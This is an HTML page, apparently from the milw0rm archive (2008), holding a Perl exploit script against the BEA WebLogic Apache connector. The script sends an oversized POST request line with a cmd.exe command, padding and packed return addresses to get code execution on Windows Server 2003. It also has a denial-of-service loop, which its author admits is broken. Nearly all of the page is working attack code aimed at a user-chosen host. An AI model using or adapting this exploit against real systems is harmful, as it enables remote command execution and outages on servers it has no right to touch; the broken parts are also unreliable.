<html><head><title>Bea Weblogic Apache Connector Code Exec / Denial of Service Exploit</title></head><pre>#// Bea Weblogic -- Apache Connector Remote Exploit +-1day
#// Should stack break latest Windows Server 2003 &lt;address space randomization&gt;
#// BIG THANKS TO 
#// &quot;dong-hun you&quot;(Xpl017Elz) in INetCop - for his paper
#// &quot;Title: Advanced exploitation in exec-shield (Fedora Core case study)&quot;
#// His technique works fine against Windows 2003 latest version.
#//
#// The code is broken, since I am chilling out for now
#// SKIDDI BULLETPROOF
#// You may fixup the DoS Code, Windows Code Works on English OSs
#// KingCope -- July/2008

use IO::Socket;
use strict;

$|=1;
my $apacheport = 80;	#// Touch
###
my $wrongusage = 0;
my $dodoshost = 0;

###############################################################################
### Target List Entries |Operating System and Patch Level / Kernel Version|
###############################################################################
my @targets = ();
my @tgtname = ();
print &quot;-&quot; x 80;
$targets[0] = &quot;1 Windows Server 2003 Enterprise Edition SP2 RC1 -- English\n&quot;;
$tgtname[0] = $targets[0];
$targets[100] = &quot;2 Denial of Service\n&quot;;
$tgtname[100] = $targets[100];

###############################################################################
### Print Of Target List And Usage
###############################################################################
print &quot;\n&quot;;

print &quot;Bea Weblogic -- Apache Connector Remote Exploit\n\n&quot;;
print &quot;Target List:\n&quot;;

foreach my $target (@targets) {	
	print $target;
}
print &quot;\n\n&quot;;
print &quot;-&quot; x 80;
print &quot;Usage: perl bea-unlock.pl &lt;hostname or ip&gt; &lt;target&gt;&quot;;
print &quot;\n&quot;;

printusage:
if ($wrongusage == 1) {	exit; }

################################################################################
### Argument Parsing
################################################################################
my $host = $ARGV[0];
my $target = $ARGV[1];

if (($host == &quot;&quot;) || ($target == &quot;&quot;)) {
	$wrongusage = 1;
	goto printusage;
}

################################################################################
### Setup Socket
################################################################################
setupsocket:
my $sock = IO::Socket::INET-&gt;new(PeerAddr =&gt; $host,
                           	     PeerPort =&gt; $apacheport,
   	                             Proto    =&gt; 'tcp');
if ($dodoshost == 1) {
	goto doshost;	
}
################################################################################
### Select Target
################################################################################
if ($target == 1) {
	print &quot;Exploiting $host -- &quot; . $tgtname[$target-1];
	goto winexpl;
}

if ($target == 2) {
    print &quot;Attacking Host $host -- Denial of Service -- Wait ...\n&quot;;
	goto doshost;
}

################################################################################
### Exploitation of Windows Versions
################################################################################
winexpl:
####WORKS [LOOKUP THE HOSTNAME]
my $command = &quot;echo works &gt; c:\\desiredfile.txt&quot;;
			 
my $cmds = &quot;cmd.exe /c \&quot;$command\&quot;|&quot;;

my $sc = $cmds;

#### STACKBREAKING WITH WINEXEC() ON WINDOWS

my $c = &quot;C&quot; x 97 . pack(&quot;L&quot;, 0x10013930) x 3 . pack(&quot;L&quot;, 0x10013930) . pack(&quot;L&quot;, 0x10013931) . pack(&quot;L&quot;,0x77EA411E);
my $a = $cmds . &quot;A&quot; x (4000-length($cmds)) . $c;

print $sock &quot;POST /.jsp $a\r\nHost: localhost\r\n\r\n&quot;;

while (&lt;$sock&gt;) {	
	print;
}
################################################################################
### Denial of Service Against The Apache Frontend Module For Bea Weblogic
################################################################################
####NEEDS SOME FIXUP
doshost:
$dodoshost = 1;

while(1) {
	$a = &quot;A&quot; x 6000;
	goto setupsocket;
	print $sock &quot;POST /.jsp $a\r\n\r\nHost: localhost\r\n\r\n&quot;;
	while(read($sock,$_,100)) {
		my $dosagain = 0;
		
		if ($dosagain eq 1) {
				&quot;Server is down now\n&quot;;
				exit;
		}
		
		if ($_ =~ /Server/) {
			print &quot;.&quot;;
			$dosagain = 1;
			next;
		}
	}
}

# milw0rm.com [2008-07-17]</pre></html>